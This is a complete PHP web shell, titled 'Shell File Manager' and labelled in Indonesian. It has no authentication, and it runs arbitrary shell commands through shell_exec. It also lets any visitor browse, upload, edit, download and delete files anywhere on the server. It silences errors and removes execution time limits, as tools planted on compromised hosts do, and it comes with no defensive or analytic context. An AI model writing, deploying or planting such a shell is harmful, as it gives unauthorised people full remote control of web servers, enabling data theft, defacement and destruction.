<?php
@error_reporting(0);
@set_time_limit(0);
@ini_set("display_errors", 0);
function f($c){return "<pre>".htmlspecialchars($c)."</pre>";}
function r($f){return is_writable($f)?"🟢":"🔴";}
$cwd = isset($_GET['d']) ? $_GET['d'] : getcwd();
@chdir($cwd);
$cwd = getcwd();
$files = @scandir($cwd);

if (isset($_GET['cmd'])) {
    $out = shell_exec($_POST['command']." 2>&1");
    @ob_clean(); @flush();
    echo "<textarea style='width:100%;height:300px;'>$out</textarea>";
    exit;
}

if (isset($_GET['upload']) && isset($_FILES['f'])) {
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
}

if (isset($_GET['delete'])) {
    $t = $_GET['delete'];
    if (is_file($t)) unlink($t);
    elseif (is_dir($t)) rmdir($t);
}

if (isset($_GET['edit'])) {
    if (isset($_POST['content'])) {
        file_put_contents($_GET['edit'], $_POST['content']);
        echo "<script>alert('Saved!');window.location='?d=$cwd';</script>";
        exit;
    }
    echo "<form method=post><textarea name=content style='width:100%;height:400px;'>".htmlspecialchars(file_get_contents($_GET['edit']))."</textarea><br><input type=submit value='Save'></form>";
    exit;
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    header("Content-Type: application/octet-stream");
    header("Content-Disposition: attachment; filename=\"".basename($file)."\"");
    readfile($file);
    exit;
}
?>

<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Shell File Manager</title>
<style>
body { background:#111; color:#eee; font-family:monospace; }
a { color:#6cf; text-decoration:none; }
a:hover { text-decoration:underline; }
table { width:100%; border-collapse:collapse; }
td, th { padding:6px; border:1px solid #333; }
input[type=file], input[type=text], textarea { background:#222; color:#0f0; border:1px solid #555; padding:4px; width:100%; }
</style>
</head><body>

<h2>📁 Directory: <?=htmlspecialchars($cwd)?></h2>

<form method="POST" enctype="multipart/form-data" action="?d=<?=urlencode($cwd)?>&upload">
    <input type="file" name="f"><input type="submit" value="Upload">
</form>

<table>
<tr><th>Nama</th><th>Ukuran</th><th>Write</th><th>Aksi</th></tr>
<?php
foreach ($files as $f) {
    if ($f == '.') continue;
    $path = "$cwd/$f";
    echo "<tr>";
    echo "<td>".(is_dir($path) ? "<a href='?d=".urlencode(realpath($path))."'>📂 $f</a>" : "📄 $f")."</td>";
    echo "<td>".(is_file($path) ? filesize($path)." B" : "-")."</td>";
    echo "<td>".r($path)."</td>";
    echo "<td>";
    if (is_file($path)) {
        echo "<a href='?d=$cwd&edit=".urlencode($path)."'>Edit</a> | ";
        echo "<a href='?d=$cwd&download=".urlencode($path)."'>Download</a> | ";
    }
    echo "<a href='?d=$cwd&delete=".urlencode($path)."' onclick='return confirm(\"Delete $f?\")'>Delete</a>";
    echo "</td></tr>";
}
?>
</table>

<h3>CMD Panel</h3>
<form method="POST" action="?cmd" onsubmit="runCmd(this); return false;">
    <input type="text" name="command" id="cmd" placeholder="whoami && uname -a">
    <input type="submit" value="Run">
</form>
<iframe name="out" style="width:100%;height:300px;background:#000;color:#0f0;border:1px solid #444;"></iframe>

<script>
function runCmd(form){
    const fd = new FormData(form);
    fetch('?cmd', {method: 'POST', body: fd})
        .then(r => r.text())
        .then(t => {
            const f = document.querySelector('iframe').contentWindow.document;
            f.open(); f.write(t); f.close();
        });
}
</script>

</body></html>